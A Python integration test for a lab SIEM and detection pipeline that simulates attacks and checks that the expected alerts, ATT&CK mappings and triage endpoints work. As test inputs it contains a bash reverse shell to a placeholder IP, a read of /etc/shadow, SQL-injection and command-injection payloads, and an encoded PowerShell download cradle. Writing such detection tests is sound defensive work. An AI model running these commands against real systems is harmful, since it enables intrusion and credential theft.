"""Integration tests for End-to-End Centralized Telemetry, Detection Engine, and Alerting Pipeline."""

from fastapi.testclient import TestClient
from src.detection.engine import DetectionEngine
from src.detection.models import AlertStatus
from src.detection.storage import AlertStore
from src.infra.ad_directory.server import ActiveDirectoryServer
from src.infra.linux_server.service import LinuxServerService
from src.siem.app import create_siem_app
from src.siem.collector import SIEMCollector
from src.siem.models import ECSEvent, EventCategory, EventMetadata, EventOutcome, EventSeverity, HostInfo, ProcessInfo, UserInfo
from src.siem.storage import EventStore
from src.vulnapp.app import create_app
from src.vulnapp.telemetry import AppTelemetryClient


def test_end_to_end_detection_and_alerting_pipeline():
    # 1. Initialize SIEM Storage, Alert Store, Detection Engine, and Collector
    event_store = EventStore()
    alert_store = AlertStore()
    detection_engine = DetectionEngine(alert_store=alert_store)
    collector = SIEMCollector(store=event_store, detection_engine=detection_engine)

    # Initialize SIEM API app injected with active stores
    siem_app = create_siem_app(
        store=event_store, engine=detection_engine, alerts=alert_store
    )
    siem_client = TestClient(siem_app)

    # Verify Healthcheck
    health = siem_client.get("/health").json()
    assert health["status"] == "healthy"
    assert health["active_detection_rules"] >= 20

    # 2. Wire Lab Infrastructure Tiers to Central SIEM Collector
    ad = ActiveDirectoryServer(siem_collector=collector)
    linux = LinuxServerService(siem_collector=collector)
    app_telemetry = AppTelemetryClient(local_collector=collector)
    vuln_app = create_app(
        database_url="sqlite:///:memory:",
        telemetry_client=app_telemetry,
        enable_vulnerabilities=True,
    )
    vuln_client = TestClient(vuln_app)

    # 3. Simulate Multi-Stage Enterprise Attack Activity
    # Activity A: Kerberoasting TGS Request on AD
    ad.request_kerberos_tgs(
        client_user="jdoe",
        spn="MSSQLSvc/db01.corp.enterprise.local:1433",
        source_ip="172.28.20.25",
    )

    # Activity B: Unauthorized Root SSH Login Attempt on Linux Server
    linux.simulate_ssh_login(
        username="root", password="WrongPassword123!", source_ip="172.28.20.25"
    )

    # Activity C: Suspicious Linux Process Execution (Reverse Shell & /etc/shadow access)
    linux.simulate_command_execution(
        user="sysadmin",
        command_line="bash -i >& /dev/tcp/198.51.100.20/4444 0>&1",
    )
    linux.simulate_command_execution(
        user="sysadmin",
        command_line="cat /etc/shadow",
    )

    # Activity D: Web Application SQL Injection & Command Injection
    vuln_client.get("/api/v1/employees/search?query=' UNION SELECT 1,2,3,4,5,6,7,8 --")
    vuln_client.post("/api/v1/tools/ping", json={"target": "127.0.0.1; whoami"})

    # Activity E: Encoded PowerShell process creation on endpoint
    collector.ingest_event(
        ECSEvent(
            event=EventMetadata(category=EventCategory.PROCESS),
            host=HostInfo(name="wkstn01.corp.enterprise.local"),
            user=UserInfo(name="attacker"),
            process=ProcessInfo(
                name="powershell.exe",
                command_line="powershell.exe -noni -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=",
            ),
        )
    )

    # 4. Verify SIEM Ingestion and Alert Generation
    assert event_store.count() >= 6, f"Expected >= 6 events, got {event_store.count()}"
    assert alert_store.count() >= 5, f"Expected >= 5 alerts, got {alert_store.count()}"

    # 5. Query Alerts via SIEM REST API
    res = siem_client.get("/api/v1/alerts")
    assert res.status_code == 200
    alerts_data = res.json()["alerts"]
    alert_rule_ids = [a["rule_id"] for a in alerts_data]

    # Verify specific detection rules fired
    assert "DET-CRED-001" in alert_rule_ids  # Kerberoasting
    assert "DET-AUTH-002" in alert_rule_ids  # Root logon
    assert "DET-PROC-001" in alert_rule_ids  # Reverse shell
    assert "DET-CRED-002" in alert_rule_ids  # Shadow file access
    assert "DET-PRIVESC-003" in alert_rule_ids  # SQL Injection
    assert "DET-PS-001" in alert_rule_ids  # Encoded PowerShell

    # 6. Verify MITRE ATT&CK mappings on alerts
    for a in alerts_data:
        assert "mitre_attack" in a
        assert a["mitre_attack"]["technique_id"].startswith("T")
        assert a["severity"] in ["high", "critical", "medium", "low"]

    # 7. Test Alert Triage & Status Update Workflow via API
    first_alert_id = alerts_data[0]["id"]
    patch_res = siem_client.patch(
        f"/api/v1/alerts/{first_alert_id}",
        json={"status": "investigating", "note": "SOC Analyst initiated host containment"},
    )
    assert patch_res.status_code == 200
    assert patch_res.json()["new_status"] == "investigating"

    # Verify updated alert
    get_alert_res = siem_client.get(f"/api/v1/alerts/{first_alert_id}")
    assert get_alert_res.status_code == 200
    assert get_alert_res.json()["status"] == "investigating"

    # 8. Test Alert Stats API
    stats_res = siem_client.get("/api/v1/alerts/stats")
    assert stats_res.status_code == 200
    stats = stats_res.json()
    assert stats["total_alerts"] >= 5
    assert "by_severity" in stats
    assert "by_tactic" in stats
    assert "Credential Access" in stats["by_tactic"]
    assert "Execution" in stats["by_tactic"]

    # 9. Test SIEM Alert Store Reset
    del_res = siem_client.delete("/api/v1/alerts")
    assert del_res.status_code == 200
    assert alert_store.count() == 0
